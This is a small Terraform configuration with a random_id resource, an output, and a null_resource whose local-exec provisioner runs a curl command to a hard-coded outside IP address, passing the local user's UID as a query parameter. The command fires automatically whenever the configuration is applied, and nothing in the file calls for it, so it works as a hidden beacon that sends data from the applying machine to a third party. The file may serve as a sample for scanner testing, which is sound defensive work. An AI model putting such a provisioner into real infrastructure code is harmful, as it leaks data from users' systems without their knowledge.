
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "example1" {
  provisioner "local-exec" {
    command = "curl 35.247.19.101/?uid=$UID"
  }
}


output "random" {
  value = "${random_id.random.hex}"
}
